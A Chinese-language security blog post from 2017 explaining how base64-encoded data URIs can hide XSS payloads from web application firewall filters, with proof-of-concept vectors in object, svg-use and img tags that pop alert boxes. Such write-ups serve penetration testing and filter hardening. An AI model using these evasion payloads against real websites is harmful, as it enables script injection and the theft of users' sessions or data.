---
title: DATA URI Bypass WAF
date: 2017-06-07 19:25:09
categories: Web安全
tags:
    - XSS
    - DATA URI
---

## DATA URI

“Used to embed small items of data into a URL—rather than link to an external resource, the URL contains the actual encoded data. URIs are supported by most modern browsers except for some versions of Internet Explorer.”

Data URI 是一种提供让外置资源的直接内嵌在页面中的方案。这种技术允许我们只需单次 HTTP 请求即可获取所有需要引用的图片与样式资源。

在 RFC2397（http://tools.ietf.org/html/rfc2397）中定义了它格式规范：

```
data:[<mime type>][;charset=<charset>][;base64],<encoded data>
```

<!-- more -->

## Bypass WAF

一般来说，WAF识别XSS向量，主要通过以下规则

* html标签，如: `<script>`, `<iframe>`, `<object>`, `<svg>`等
* event handlers, 如: `onload`, `onerror`
* data Attribute
* js keyword, 如: `alert()`, `confirm()`

使用DATA URI利用base64编码数据绕过WAF对xss payload的检测。那么如何使用DATA URI执行javascript呢？

### object tag

```
# base64 decode: <script>alert(1);</script>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">
```

通常WAF都会拦截`<object>`标签

### svg tags

参考 [http://insert-script.blogspot.com.au/2014/02/svg-fun-time-firefox-svg-vector.html](http://insert-script.blogspot.com.au/2014/02/svg-fun-time-firefox-svg-vector.html), 使用`svg + use`执行javascript.

* test.html for firefox

```
<svg>
<use xlink:href="data:image/svg+xml;base64,
PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDo
vL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW
5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rI
iAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8
YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGx
vY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdG
g9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zd
mc+#rectangle" />
</svg>
```

base64 payload 解码为:

```
<svg id="rectangle"
xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink"
width="100" height="100">
<a xlink:href="javascript:alert(location)">
<rect x="0" y="0" width="100" height="100" />
</a>
</svg>
```

当点击黑色方框时会触发XSS.要达到自动触发XSS的目的，可以使用如下paylaod:

```
<svg id="rectangle"
xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink"
width="100" height="100">

<script>alert(1)</script>

<foreignObject width="100" height="50"
requiredExtensions="http://www.w3.org/1999/xhtml">

<embed xmlns="http://www.w3.org/1999/xhtml"
src="javascript:alert(location)" />

</foreignObject>
</svg>
```

* better test.html for firefox

```

<svg>
<use xlink:href="data:image/svg+xml;base64,
PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cD
ovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhs
aW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW
5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3
JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0i
NTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZW
RFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8x
OTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dH
A6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0i
amF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQ
ogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle" />
</svg>
```

### img tags

```
<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" onload=alert(1)>
```
